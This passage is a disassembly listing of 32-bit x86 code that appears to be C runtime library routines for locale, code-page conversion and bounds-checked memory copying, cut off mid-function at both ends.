  40889c:	8b f0                	mov    %eax,%esi
  40889e:	59                   	pop    %ecx
  40889f:	59                   	pop    %ecx
  4088a0:	3b f3                	cmp    %ebx,%esi
  4088a2:	75 1b                	jne    0x4088bf
  4088a4:	e8 12 ec ff ff       	call   0x4074bb
  4088a9:	c7 00 16 00 00 00    	movl   $0x16,(%eax)
  4088af:	8b f3                	mov    %ebx,%esi
  4088b1:	57                   	push   %edi
  4088b2:	e8 10 f2 ff ff       	call   0x407ac7
  4088b7:	59                   	pop    %ecx
  4088b8:	5f                   	pop    %edi
  4088b9:	8b c6                	mov    %esi,%eax
  4088bb:	5e                   	pop    %esi
  4088bc:	5b                   	pop    %ebx
  4088bd:	c9                   	leave
  4088be:	c3                   	ret
  4088bf:	80 7d 0c 00          	cmpb   $0x0,0xc(%ebp)
  4088c3:	75 05                	jne    0x4088ca
  4088c5:	e8 7e dc ff ff       	call   0x406548
  4088ca:	8b 45 10             	mov    0x10(%ebp),%eax
  4088cd:	8b 40 48             	mov    0x48(%eax),%eax
  4088d0:	f0 0f c1 18          	lock xadd %ebx,(%eax)
  4088d4:	4b                   	dec    %ebx
  4088d5:	75 15                	jne    0x4088ec
  4088d7:	8b 45 10             	mov    0x10(%ebp),%eax
  4088da:	81 78 48 28 61 41 00 	cmpl   $0x416128,0x48(%eax)
  4088e1:	74 09                	je     0x4088ec
  4088e3:	ff 70 48             	push   0x48(%eax)
  4088e6:	e8 dc f1 ff ff       	call   0x407ac7
  4088eb:	59                   	pop    %ecx
  4088ec:	c7 07 01 00 00 00    	movl   $0x1,(%edi)
  4088f2:	8b cf                	mov    %edi,%ecx
  4088f4:	8b 45 10             	mov    0x10(%ebp),%eax
  4088f7:	33 ff                	xor    %edi,%edi
  4088f9:	89 48 48             	mov    %ecx,0x48(%eax)
  4088fc:	8b 4d 10             	mov    0x10(%ebp),%ecx
  4088ff:	a1 a0 66 41 00       	mov    0x4166a0,%eax
  408904:	85 81 50 03 00 00    	test   %eax,0x350(%ecx)
  40890a:	75 a5                	jne    0x4088b1
  40890c:	8d 45 10             	lea    0x10(%ebp),%eax
  40890f:	89 45 ec             	mov    %eax,-0x14(%ebp)
  408912:	8d 4d ff             	lea    -0x1(%ebp),%ecx
  408915:	6a 05                	push   $0x5
  408917:	8d 45 14             	lea    0x14(%ebp),%eax
  40891a:	89 45 f0             	mov    %eax,-0x10(%ebp)
  40891d:	58                   	pop    %eax
  40891e:	89 45 f4             	mov    %eax,-0xc(%ebp)
  408921:	89 45 f8             	mov    %eax,-0x8(%ebp)
  408924:	8d 45 f4             	lea    -0xc(%ebp),%eax
  408927:	50                   	push   %eax
  408928:	8d 45 ec             	lea    -0x14(%ebp),%eax
  40892b:	50                   	push   %eax
  40892c:	8d 45 f8             	lea    -0x8(%ebp),%eax
  40892f:	50                   	push   %eax
  408930:	e8 a1 fb ff ff       	call   0x4084d6
  408935:	80 7d 0c 00          	cmpb   $0x0,0xc(%ebp)
  408939:	0f 84 72 ff ff ff    	je     0x4088b1
  40893f:	8b 45 14             	mov    0x14(%ebp),%eax
  408942:	8b 00                	mov    (%eax),%eax
  408944:	a3 1c 61 41 00       	mov    %eax,0x41611c
  408949:	e9 63 ff ff ff       	jmp    0x4088b1
  40894e:	6a 0c                	push   $0xc
  408950:	68 18 4a 41 00       	push   $0x414a18
  408955:	e8 96 b8 ff ff       	call   0x4041f0
  40895a:	33 f6                	xor    %esi,%esi
  40895c:	89 75 e4             	mov    %esi,-0x1c(%ebp)
  40895f:	8b 7d 08             	mov    0x8(%ebp),%edi
  408962:	a1 a0 66 41 00       	mov    0x4166a0,%eax
  408967:	85 87 50 03 00 00    	test   %eax,0x350(%edi)
  40896d:	74 0e                	je     0x40897d
  40896f:	39 77 4c             	cmp    %esi,0x4c(%edi)
  408972:	74 09                	je     0x40897d
  408974:	8b 77 48             	mov    0x48(%edi),%esi
  408977:	85 f6                	test   %esi,%esi
  408979:	74 6d                	je     0x4089e8
  40897b:	eb 59                	jmp    0x4089d6
  40897d:	6a 05                	push   $0x5
  40897f:	e8 39 f0 ff ff       	call   0x4079bd
  408984:	59                   	pop    %ecx
  408985:	89 75 fc             	mov    %esi,-0x4(%ebp)
  408988:	8b 77 48             	mov    0x48(%edi),%esi
  40898b:	89 75 e4             	mov    %esi,-0x1c(%ebp)
  40898e:	8b 5d 0c             	mov    0xc(%ebp),%ebx
  408991:	3b 33                	cmp    (%ebx),%esi
  408993:	74 27                	je     0x4089bc
  408995:	85 f6                	test   %esi,%esi
  408997:	74 18                	je     0x4089b1
  408999:	83 c8 ff             	or     $0xffffffff,%eax
  40899c:	f0 0f c1 06          	lock xadd %eax,(%esi)
  4089a0:	75 0f                	jne    0x4089b1
  4089a2:	81 fe 28 61 41 00    	cmp    $0x416128,%esi
  4089a8:	74 07                	je     0x4089b1
  4089aa:	56                   	push   %esi
  4089ab:	e8 17 f1 ff ff       	call   0x407ac7
  4089b0:	59                   	pop    %ecx
  4089b1:	8b 33                	mov    (%ebx),%esi
  4089b3:	89 77 48             	mov    %esi,0x48(%edi)
  4089b6:	89 75 e4             	mov    %esi,-0x1c(%ebp)
  4089b9:	f0 ff 06             	lock incl (%esi)
  4089bc:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  4089c3:	e8 05 00 00 00       	call   0x4089cd
  4089c8:	eb ad                	jmp    0x408977
  4089ca:	8b 75 e4             	mov    -0x1c(%ebp),%esi
  4089cd:	6a 05                	push   $0x5
  4089cf:	e8 31 f0 ff ff       	call   0x407a05
  4089d4:	59                   	pop    %ecx
  4089d5:	c3                   	ret
  4089d6:	8b c6                	mov    %esi,%eax
  4089d8:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  4089db:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  4089e2:	59                   	pop    %ecx
  4089e3:	5f                   	pop    %edi
  4089e4:	5e                   	pop    %esi
  4089e5:	5b                   	pop    %ebx
  4089e6:	c9                   	leave
  4089e7:	c3                   	ret
  4089e8:	e8 d0 e1 ff ff       	call   0x406bbd
  4089ed:	cc                   	int3
  4089ee:	80 3d a4 70 41 00 00 	cmpb   $0x0,0x4170a4
  4089f5:	75 3c                	jne    0x408a33
  4089f7:	c7 05 9c 70 41 00 28 	movl   $0x416128,0x41709c
  4089fe:	61 41 00 
  408a01:	c7 05 98 70 41 00 50 	movl   $0x416450,0x417098
  408a08:	64 41 00 
  408a0b:	c7 05 94 70 41 00 48 	movl   $0x416348,0x417094
  408a12:	63 41 00 
  408a15:	e8 a3 e6 ff ff       	call   0x4070bd
  408a1a:	68 9c 70 41 00       	push   $0x41709c
  408a1f:	50                   	push   %eax
  408a20:	6a 01                	push   $0x1
  408a22:	6a fd                	push   $0xfffffffd
  408a24:	e8 11 fe ff ff       	call   0x40883a
  408a29:	83 c4 10             	add    $0x10,%esp
  408a2c:	c6 05 a4 70 41 00 01 	movb   $0x1,0x4170a4
  408a33:	b0 01                	mov    $0x1,%al
  408a35:	c3                   	ret
  408a36:	68 9c 70 41 00       	push   $0x41709c
  408a3b:	e8 c0 e5 ff ff       	call   0x407000
  408a40:	50                   	push   %eax
  408a41:	e8 08 ff ff ff       	call   0x40894e
  408a46:	59                   	pop    %ecx
  408a47:	59                   	pop    %ecx
  408a48:	c3                   	ret
  408a49:	8b ff                	mov    %edi,%edi
  408a4b:	55                   	push   %ebp
  408a4c:	8b ec                	mov    %esp,%ebp
  408a4e:	83 ec 20             	sub    $0x20,%esp
  408a51:	a1 04 60 41 00       	mov    0x416004,%eax
  408a56:	33 c5                	xor    %ebp,%eax
  408a58:	89 45 fc             	mov    %eax,-0x4(%ebp)
  408a5b:	53                   	push   %ebx
  408a5c:	56                   	push   %esi
  408a5d:	8b 75 0c             	mov    0xc(%ebp),%esi
  408a60:	57                   	push   %edi
  408a61:	ff 75 08             	push   0x8(%ebp)
  408a64:	e8 7b fb ff ff       	call   0x4085e4
  408a69:	8b d8                	mov    %eax,%ebx
  408a6b:	59                   	pop    %ecx
  408a6c:	85 db                	test   %ebx,%ebx
  408a6e:	0f 84 b0 01 00 00    	je     0x408c24
  408a74:	33 ff                	xor    %edi,%edi
  408a76:	8b cf                	mov    %edi,%ecx
  408a78:	8b c7                	mov    %edi,%eax
  408a7a:	89 4d e4             	mov    %ecx,-0x1c(%ebp)
  408a7d:	39 98 58 65 41 00    	cmp    %ebx,0x416558(%eax)
  408a83:	0f 84 f3 00 00 00    	je     0x408b7c
  408a89:	41                   	inc    %ecx
  408a8a:	83 c0 30             	add    $0x30,%eax
  408a8d:	89 4d e4             	mov    %ecx,-0x1c(%ebp)
  408a90:	3d f0 00 00 00       	cmp    $0xf0,%eax
  408a95:	72 e6                	jb     0x408a7d
  408a97:	81 fb e8 fd 00 00    	cmp    $0xfde8,%ebx
  408a9d:	0f 84 d1 00 00 00    	je     0x408b74
  408aa3:	0f b7 c3             	movzwl %bx,%eax
  408aa6:	50                   	push   %eax
  408aa7:	ff 15 c8 f1 40 00    	call   *0x40f1c8
  408aad:	85 c0                	test   %eax,%eax
  408aaf:	0f 84 bf 00 00 00    	je     0x408b74
  408ab5:	b8 e9 fd 00 00       	mov    $0xfde9,%eax
  408aba:	3b d8                	cmp    %eax,%ebx
  408abc:	75 26                	jne    0x408ae4
  408abe:	89 46 04             	mov    %eax,0x4(%esi)
  408ac1:	89 be 1c 02 00 00    	mov    %edi,0x21c(%esi)
  408ac7:	89 7e 18             	mov    %edi,0x18(%esi)
  408aca:	66 89 7e 1c          	mov    %di,0x1c(%esi)
  408ace:	89 7e 08             	mov    %edi,0x8(%esi)
  408ad1:	33 c0                	xor    %eax,%eax
  408ad3:	8d 7e 0c             	lea    0xc(%esi),%edi
  408ad6:	ab                   	stos   %eax,%es:(%edi)
  408ad7:	ab                   	stos   %eax,%es:(%edi)
  408ad8:	ab                   	stos   %eax,%es:(%edi)
  408ad9:	56                   	push   %esi
  408ada:	e8 db fb ff ff       	call   0x4086ba
  408adf:	e9 46 01 00 00       	jmp    0x408c2a
  408ae4:	8d 45 e8             	lea    -0x18(%ebp),%eax
  408ae7:	50                   	push   %eax
  408ae8:	53                   	push   %ebx
  408ae9:	ff 15 d4 f1 40 00    	call   *0x40f1d4
  408aef:	85 c0                	test   %eax,%eax
  408af1:	74 75                	je     0x408b68
  408af3:	68 01 01 00 00       	push   $0x101
  408af8:	8d 46 18             	lea    0x18(%esi),%eax
  408afb:	57                   	push   %edi
  408afc:	50                   	push   %eax
  408afd:	e8 8e bf ff ff       	call   0x404a90
  408b02:	83 c4 0c             	add    $0xc,%esp
  408b05:	89 5e 04             	mov    %ebx,0x4(%esi)
  408b08:	83 7d e8 02          	cmpl   $0x2,-0x18(%ebp)
  408b0c:	89 be 1c 02 00 00    	mov    %edi,0x21c(%esi)
  408b12:	75 ba                	jne    0x408ace
  408b14:	80 7d ee 00          	cmpb   $0x0,-0x12(%ebp)
  408b18:	8d 45 ee             	lea    -0x12(%ebp),%eax
  408b1b:	74 21                	je     0x408b3e
  408b1d:	8a 48 01             	mov    0x1(%eax),%cl
  408b20:	84 c9                	test   %cl,%cl
  408b22:	74 1a                	je     0x408b3e
  408b24:	0f b6 d1             	movzbl %cl,%edx
  408b27:	0f b6 08             	movzbl (%eax),%ecx
  408b2a:	eb 06                	jmp    0x408b32
  408b2c:	80 4c 0e 19 04       	orb    $0x4,0x19(%esi,%ecx,1)
  408b31:	41                   	inc    %ecx
  408b32:	3b ca                	cmp    %edx,%ecx
  408b34:	76 f6                	jbe    0x408b2c
  408b36:	83 c0 02             	add    $0x2,%eax
  408b39:	80 38 00             	cmpb   $0x0,(%eax)
  408b3c:	75 df                	jne    0x408b1d
  408b3e:	8d 46 1a             	lea    0x1a(%esi),%eax
  408b41:	b9 fe 00 00 00       	mov    $0xfe,%ecx
  408b46:	80 08 08             	orb    $0x8,(%eax)
  408b49:	40                   	inc    %eax
  408b4a:	83 e9 01             	sub    $0x1,%ecx
  408b4d:	75 f7                	jne    0x408b46
  408b4f:	ff 76 04             	push   0x4(%esi)
  408b52:	e8 4f fa ff ff       	call   0x4085a6
  408b57:	33 ff                	xor    %edi,%edi
  408b59:	89 86 1c 02 00 00    	mov    %eax,0x21c(%esi)
  408b5f:	83 c4 04             	add    $0x4,%esp
  408b62:	47                   	inc    %edi
  408b63:	e9 66 ff ff ff       	jmp    0x408ace
  408b68:	39 3d a0 70 41 00    	cmp    %edi,0x4170a0
  408b6e:	0f 85 b0 00 00 00    	jne    0x408c24
  408b74:	83 c8 ff             	or     $0xffffffff,%eax
  408b77:	e9 b1 00 00 00       	jmp    0x408c2d
  408b7c:	68 01 01 00 00       	push   $0x101
  408b81:	8d 46 18             	lea    0x18(%esi),%eax
  408b84:	57                   	push   %edi
  408b85:	50                   	push   %eax
  408b86:	e8 05 bf ff ff       	call   0x404a90
  408b8b:	83 c4 0c             	add    $0xc,%esp
  408b8e:	6b 45 e4 30          	imul   $0x30,-0x1c(%ebp),%eax
  408b92:	89 45 e0             	mov    %eax,-0x20(%ebp)
  408b95:	8d 80 68 65 41 00    	lea    0x416568(%eax),%eax
  408b9b:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  408b9e:	80 38 00             	cmpb   $0x0,(%eax)
  408ba1:	8b c8                	mov    %eax,%ecx
  408ba3:	74 35                	je     0x408bda
  408ba5:	8a 41 01             	mov    0x1(%ecx),%al
  408ba8:	84 c0                	test   %al,%al
  408baa:	74 2b                	je     0x408bd7
  408bac:	0f b6 11             	movzbl (%ecx),%edx
  408baf:	0f b6 c0             	movzbl %al,%eax
  408bb2:	eb 17                	jmp    0x408bcb
  408bb4:	81 fa 00 01 00 00    	cmp    $0x100,%edx
  408bba:	73 13                	jae    0x408bcf
  408bbc:	8a 87 50 65 41 00    	mov    0x416550(%edi),%al
  408bc2:	08 44 16 19          	or     %al,0x19(%esi,%edx,1)
  408bc6:	42                   	inc    %edx
  408bc7:	0f b6 41 01          	movzbl 0x1(%ecx),%eax
  408bcb:	3b d0                	cmp    %eax,%edx
  408bcd:	76 e5                	jbe    0x408bb4
  408bcf:	83 c1 02             	add    $0x2,%ecx
  408bd2:	80 39 00             	cmpb   $0x0,(%ecx)
  408bd5:	75 ce                	jne    0x408ba5
  408bd7:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  408bda:	47                   	inc    %edi
  408bdb:	83 c0 08             	add    $0x8,%eax
  408bde:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  408be1:	83 ff 04             	cmp    $0x4,%edi
  408be4:	72 b8                	jb     0x408b9e
  408be6:	53                   	push   %ebx
  408be7:	89 5e 04             	mov    %ebx,0x4(%esi)
  408bea:	c7 46 08 01 00 00 00 	movl   $0x1,0x8(%esi)
  408bf1:	e8 b0 f9 ff ff       	call   0x4085a6
  408bf6:	83 c4 04             	add    $0x4,%esp
  408bf9:	89 86 1c 02 00 00    	mov    %eax,0x21c(%esi)
  408bff:	8b 45 e0             	mov    -0x20(%ebp),%eax
  408c02:	8d 4e 0c             	lea    0xc(%esi),%ecx
  408c05:	6a 06                	push   $0x6
  408c07:	8d 90 5c 65 41 00    	lea    0x41655c(%eax),%edx
  408c0d:	5f                   	pop    %edi
  408c0e:	66 8b 02             	mov    (%edx),%ax
  408c11:	8d 52 02             	lea    0x2(%edx),%edx
  408c14:	66 89 01             	mov    %ax,(%ecx)
  408c17:	8d 49 02             	lea    0x2(%ecx),%ecx
  408c1a:	83 ef 01             	sub    $0x1,%edi
  408c1d:	75 ef                	jne    0x408c0e
  408c1f:	e9 b5 fe ff ff       	jmp    0x408ad9
  408c24:	56                   	push   %esi
  408c25:	e8 2b fa ff ff       	call   0x408655
  408c2a:	33 c0                	xor    %eax,%eax
  408c2c:	59                   	pop    %ecx
  408c2d:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  408c30:	5f                   	pop    %edi
  408c31:	5e                   	pop    %esi
  408c32:	33 cd                	xor    %ebp,%ecx
  408c34:	5b                   	pop    %ebx
  408c35:	e8 0b ab ff ff       	call   0x403745
  408c3a:	c9                   	leave
  408c3b:	c3                   	ret
  408c3c:	8b ff                	mov    %edi,%edi
  408c3e:	55                   	push   %ebp
  408c3f:	8b ec                	mov    %esp,%ebp
  408c41:	56                   	push   %esi
  408c42:	8b 75 14             	mov    0x14(%ebp),%esi
  408c45:	85 f6                	test   %esi,%esi
  408c47:	75 04                	jne    0x408c4d
  408c49:	33 c0                	xor    %eax,%eax
  408c4b:	eb 6d                	jmp    0x408cba
  408c4d:	8b 45 08             	mov    0x8(%ebp),%eax
  408c50:	85 c0                	test   %eax,%eax
  408c52:	75 13                	jne    0x408c67
  408c54:	e8 62 e8 ff ff       	call   0x4074bb
  408c59:	6a 16                	push   $0x16
  408c5b:	5e                   	pop    %esi
  408c5c:	89 30                	mov    %esi,(%eax)
  408c5e:	e8 9b e7 ff ff       	call   0x4073fe
  408c63:	8b c6                	mov    %esi,%eax
  408c65:	eb 53                	jmp    0x408cba
  408c67:	57                   	push   %edi
  408c68:	8b 7d 10             	mov    0x10(%ebp),%edi
  408c6b:	85 ff                	test   %edi,%edi
  408c6d:	74 14                	je     0x408c83
  408c6f:	39 75 0c             	cmp    %esi,0xc(%ebp)
  408c72:	72 0f                	jb     0x408c83
  408c74:	56                   	push   %esi
  408c75:	57                   	push   %edi
  408c76:	50                   	push   %eax
  408c77:	e8 f4 c5 ff ff       	call   0x405270
  408c7c:	83 c4 0c             	add    $0xc,%esp
  408c7f:	33 c0                	xor    %eax,%eax
  408c81:	eb 36                	jmp    0x408cb9
  408c83:	ff 75 0c             	push   0xc(%ebp)
  408c86:	6a 00                	push   $0x0
  408c88:	50                   	push   %eax
  408c89:	e8 02 be ff ff       	call   0x404a90
  408c8e:	83 c4 0c             	add    $0xc,%esp
  408c91:	85 ff                	test   %edi,%edi
  408c93:	75 09                	jne    0x408c9e
  408c95:	e8 21 e8 ff ff       	call   0x4074bb
  408c9a:	6a 16                	push   $0x16
  408c9c:	eb 0c                	jmp    0x408caa
  408c9e:	39 75 0c             	cmp    %esi,0xc(%ebp)
  408ca1:	73 13                	jae    0x408cb6
  408ca3:	e8 13 e8 ff ff       	call   0x4074bb
  408ca8:	6a 22                	push   $0x22
  408caa:	5e                   	pop    %esi
  408cab:	89 30                	mov    %esi,(%eax)
  408cad:	e8 4c e7 ff ff       	call   0x4073fe
  408cb2:	8b c6                	mov    %esi,%eax
  408cb4:	eb 03                	jmp    0x408cb9
  408cb6:	6a 16                	push   $0x16
  408cb8:	58                   	pop    %eax
  408cb9:	5f                   	pop    %edi
  408cba:	5e                   	pop    %esi
  408cbb:	5d                   	pop    %ebp
  408cbc:	c3                   	ret
  408cbd:	8b ff                	mov    %edi,%edi
  408cbf:	55                   	push   %ebp
  408cc0:	8b ec                	mov    %esp,%ebp
  408cc2:	83 ec 10             	sub    $0x10,%esp
  408cc5:	56                   	push   %esi
  408cc6:	ff 75 08             	push   0x8(%ebp)
  408cc9:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  408ccc:	e8 8f cb ff ff       	call   0x405860
  408cd1:	0f b6 75 0c          	movzbl 0xc(%ebp),%esi
  408cd5:	8b 45 f8             	mov    -0x8(%ebp),%eax
  408cd8:	8a 4d 14             	mov    0x14(%ebp),%cl
  408cdb:	84 4c 30 19          	test   %cl,0x19(%eax,%esi,1)
  408cdf:	75 1b                	jne    0x408cfc
  408ce1:	33 d2                	xor    %edx,%edx
  408ce3:	39 55 10             	cmp    %edx,0x10(%ebp)
  408ce6:	74 0e                	je     0x408cf6
  408ce8:	8b 45 f4             	mov    -0xc(%ebp),%eax
  408ceb:	8b 00                	mov    (%eax),%eax
  408ced:	0f b7 04 70          	movzwl (%eax,%esi,2),%eax
  408cf1:	23 45 10             	and    0x10(%ebp),%eax
  408cf4:	eb 02                	jmp    0x408cf8
  408cf6:	8b c2                	mov    %edx,%eax
  408cf8:	85 c0                	test   %eax,%eax
  408cfa:	74 03                	je     0x408cff
  408cfc:	33 d2                	xor    %edx,%edx
  408cfe:	42                   	inc    %edx
  408cff:	80 7d fc 00          	cmpb   $0x0,-0x4(%ebp)
  408d03:	5e                   	pop    %esi
  408d04:	74 0a                	je     0x408d10
  408d06:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  408d09:	83 a1 50 03 00 00 fd 	andl   $0xfffffffd,0x350(%ecx)
  408d10:	8b c2                	mov    %edx,%eax
  408d12:	c9                   	leave
  408d13:	c3                   	ret
  408d14:	8b ff                	mov    %edi,%edi
  408d16:	55                   	push   %ebp
  408d17:	8b ec                	mov    %esp,%ebp
  408d19:	6a 04                	push   $0x4
  408d1b:	6a 00                	push   $0x0
  408d1d:	ff 75 08             	push   0x8(%ebp)
  408d20:	6a 00                	push   $0x0
  408d22:	e8 96 ff ff ff       	call   0x408cbd
  408d27:	83 c4 10             	add    $0x10,%esp
  408d2a:	5d                   	pop    %ebp
  408d2b:	c3                   	ret
  408d2c:	ff 15 d8 f1 40 00    	call   *0x40f1d8
  408d32:	a3 b8 70 41 00       	mov    %eax,0x4170b8
  408d37:	ff 15 dc f1 40 00    	call   *0x40f1dc
  408d3d:	a3 bc 70 41 00       	mov    %eax,0x4170bc
  408d42:	b0 01                	mov    $0x1,%al
  408d44:	c3                   	ret
  408d45:	8b ff                	mov    %edi,%edi
  408d47:	55                   	push   %ebp
  408d48:	8b ec                	mov    %esp,%ebp
  408d4a:	8b 45 08             	mov    0x8(%ebp),%eax
  408d4d:	b9 35 c4 00 00       	mov    $0xc435,%ecx
  408d52:	3b c1                	cmp    %ecx,%eax
  408d54:	77 28                	ja     0x408d7e
  408d56:	74 65                	je     0x408dbd
  408d58:	83 f8 2a             	cmp    $0x2a,%eax
  408d5b:	74 60                	je     0x408dbd
  408d5d:	3d 2b c4 00 00       	cmp    $0xc42b,%eax
  408d62:	76 15                	jbe    0x408d79
  408d64:	3d 2e c4 00 00       	cmp    $0xc42e,%eax
  408d69:	76 52                	jbe    0x408dbd
  408d6b:	3d 31 c4 00 00       	cmp    $0xc431,%eax
  408d70:	74 4b                	je     0x408dbd
  408d72:	3d 33 c4 00 00       	cmp    $0xc433,%eax
  408d77:	74 44                	je     0x408dbd
  408d79:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  408d7c:	eb 29                	jmp    0x408da7
  408d7e:	3d 98 d6 00 00       	cmp    $0xd698,%eax
  408d83:	74 1c                	je     0x408da1
  408d85:	3d a9 de 00 00       	cmp    $0xdea9,%eax
  408d8a:	76 ed                	jbe    0x408d79
  408d8c:	3d b3 de 00 00       	cmp    $0xdeb3,%eax
  408d91:	76 2a                	jbe    0x408dbd
  408d93:	3d e8 fd 00 00       	cmp    $0xfde8,%eax
  408d98:	74 23                	je     0x408dbd
  408d9a:	3d e9 fd 00 00       	cmp    $0xfde9,%eax
  408d9f:	75 d8                	jne    0x408d79
  408da1:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  408da4:	83 e1 08             	and    $0x8,%ecx
  408da7:	ff 75 1c             	push   0x1c(%ebp)
  408daa:	ff 75 18             	push   0x18(%ebp)
  408dad:	ff 75 14             	push   0x14(%ebp)
  408db0:	ff 75 10             	push   0x10(%ebp)
  408db3:	51                   	push   %ecx
  408db4:	50                   	push   %eax
  408db5:	ff 15 e0 f1 40 00    	call   *0x40f1e0
  408dbb:	5d                   	pop    %ebp
  408dbc:	c3                   	ret
  408dbd:	33 c9                	xor    %ecx,%ecx
  408dbf:	eb e6                	jmp    0x408da7
  408dc1:	8b ff                	mov    %edi,%edi
  408dc3:	55                   	push   %ebp
  408dc4:	8b ec                	mov    %esp,%ebp
  408dc6:	8b 45 08             	mov    0x8(%ebp),%eax
  408dc9:	ba e9 fd 00 00       	mov    $0xfde9,%edx
  408dce:	53                   	push   %ebx
  408dcf:	56                   	push   %esi
  408dd0:	57                   	push   %edi
  408dd1:	8d 72 ff             	lea    -0x1(%edx),%esi
  408dd4:	3b c6                	cmp    %esi,%eax
  408dd6:	74 08                	je     0x408de0
  408dd8:	3b c2                	cmp    %edx,%eax
  408dda:	74 04                	je     0x408de0
  408ddc:	32 db                	xor    %bl,%bl
  408dde:	eb 02                	jmp    0x408de2
  408de0:	b3 01                	mov    $0x1,%bl
  408de2:	b9 35 c4 00 00       	mov    $0xc435,%ecx
  408de7:	3b c1                	cmp    %ecx,%eax
  408de9:	77 23                	ja     0x408e0e
  408deb:	74 49                	je     0x408e36
  408ded:	83 f8 2a             	cmp    $0x2a,%eax
  408df0:	74 44                	je     0x408e36
  408df2:	3d 2b c4 00 00       	cmp    $0xc42b,%eax
  408df7:	76 32                	jbe    0x408e2b
  408df9:	3d 2e c4 00 00       	cmp    $0xc42e,%eax
  408dfe:	76 36                	jbe    0x408e36
  408e00:	3d 31 c4 00 00       	cmp    $0xc431,%eax
  408e05:	74 2f                	je     0x408e36
  408e07:	3d 33 c4 00 00       	cmp    $0xc433,%eax
  408e0c:	eb 1b                	jmp    0x408e29
  408e0e:	3d 98 d6 00 00       	cmp    $0xd698,%eax
  408e13:	74 21                	je     0x408e36
  408e15:	3d a9 de 00 00       	cmp    $0xdea9,%eax
  408e1a:	76 0f                	jbe    0x408e2b
  408e1c:	3d b3 de 00 00       	cmp    $0xdeb3,%eax
  408e21:	76 13                	jbe    0x408e36
  408e23:	3b c6                	cmp    %esi,%eax
  408e25:	74 0f                	je     0x408e36
  408e27:	3b c2                	cmp    %edx,%eax
  408e29:	74 0b                	je     0x408e36
  408e2b:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  408e2e:	81 e1 7f ff ff ff    	and    $0xffffff7f,%ecx
  408e34:	eb 02                	jmp    0x408e38
  408e36:	33 c9                	xor    %ecx,%ecx
  408e38:	8b 7d 24             	mov    0x24(%ebp),%edi
  408e3b:	0f b6 d3             	movzbl %bl,%edx
  408e3e:	f7 da                	neg    %edx
  408e40:	0f b6 f3             	movzbl %bl,%esi
  408e43:	1b d2                	sbb    %edx,%edx
  408e45:	f7 d2                	not    %edx
  408e47:	23 d7                	and    %edi,%edx
  408e49:	f7 de                	neg    %esi
  408e4b:	1b f6                	sbb    %esi,%esi
  408e4d:	f7 d6                	not    %esi
  408e4f:	23 75 20             	and    0x20(%ebp),%esi
  408e52:	84 db                	test   %bl,%bl
  408e54:	74 07                	je     0x408e5d
  408e56:	85 ff                	test   %edi,%edi
  408e58:	74 03                	je     0x408e5d
  408e5a:	83 27 00             	andl   $0x0,(%edi)
  408e5d:	52                   	push   %edx
  408e5e:	56                   	push   %esi
  408e5f:	ff 75 1c             	push   0x1c(%ebp)
  408e62:	ff 75 18             	push   0x18(%ebp)
  408e65:	ff 75 14             	push   0x14(%ebp)
  408e68:	ff 75 10             	push   0x10(%ebp)
  408e6b:	51                   	push   %ecx
  408e6c:	50                   	push   %eax
  408e6d:	ff 15 ac f0 40 00    	call   *0x40f0ac
  408e73:	5f                   	pop    %edi
  408e74:	5e                   	pop    %esi
  408e75:	5b                   	pop    %ebx
  408e76:	5d                   	pop    %ebp
  408e77:	c3                   	ret
  408e78:	8b ff                	mov    %edi,%edi
  408e7a:	55                   	push   %ebp
  408e7b:	8b ec                	mov    %esp,%ebp
  408e7d:	8b 55 08             	mov    0x8(%ebp),%edx
  408e80:	57                   	push   %edi
  408e81:	33 ff                	xor    %edi,%edi
  408e83:	66 39 3a             	cmp    %di,(%edx)
  408e86:	74 21                	je     0x408ea9
  408e88:	56                   	push   %esi
  408e89:	8b ca                	mov    %edx,%ecx
  408e8b:	8d 71 02             	lea    0x2(%ecx),%esi
  408e8e:	66 8b 01             	mov    (%ecx),%ax
  408e91:	83 c1 02             	add    $0x2,%ecx
  408e94:	66 3b c7             	cmp    %di,%ax
  408e97:	75 f5                	jne    0x408e8e
  408e99:	2b ce                	sub    %esi,%ecx
  408e9b:	d1 f9                	sar    $1,%ecx
  408e9d:	8d 14 4a             	lea    (%edx,%ecx,2),%edx
  408ea0:	83 c2 02             	add    $0x2,%edx
  408ea3:	66 39 3a             	cmp    %di,(%edx)
  408ea6:	75 e1                	jne    0x408e89
  408ea8:	5e                   	pop    %esi
  408ea9:	8d 42 02             	lea    0x2(%edx),%eax
  408eac:	5f                   	pop    %edi
  408ead:	5d                   	pop    %ebp
  408eae:	c3                   	ret
  408eaf:	8b ff                	mov    %edi,%edi
  408eb1:	55                   	push   %ebp
  408eb2:	8b ec                	mov    %esp,%ebp
  408eb4:	51                   	push   %ecx
  408eb5:	53                   	push   %ebx
  408eb6:	56                   	push   %esi
  408eb7:	57                   	push   %edi
  408eb8:	ff 15 e4 f1 40 00    	call   *0x40f1e4
  408ebe:	8b f0                	mov    %eax,%esi
  408ec0:	33 ff                	xor    %edi,%edi
  408ec2:	85 f6                	test   %esi,%esi
  408ec4:	74 59                	je     0x408f1f
  408ec6:	56                   	push   %esi
  408ec7:	e8 ac ff ff ff       	call   0x408e78
  408ecc:	57                   	push   %edi
  408ecd:	57                   	push   %edi
  408ece:	57                   	push   %edi
  408ecf:	8b d8                	mov    %eax,%ebx
  408ed1:	57                   	push   %edi
  408ed2:	2b de                	sub    %esi,%ebx
  408ed4:	d1 fb                	sar    $1,%ebx
  408ed6:	53                   	push   %ebx
  408ed7:	56                   	push   %esi
  408ed8:	57                   	push   %edi
  408ed9:	57                   	push   %edi
  408eda:	e8 e2 fe ff ff       	call   0x408dc1
  408edf:	83 c4 24             	add    $0x24,%esp
  408ee2:	89 45 fc             	mov    %eax,-0x4(%ebp)
  408ee5:	85 c0                	test   %eax,%eax
  408ee7:	74 36                	je     0x408f1f
  408ee9:	50                   	push   %eax
  408eea:	e8 2d eb ff ff       	call   0x407a1c
  408eef:	8b f8                	mov    %eax,%edi
  408ef1:	59                   	pop    %ecx
  408ef2:	85 ff                	test   %edi,%edi
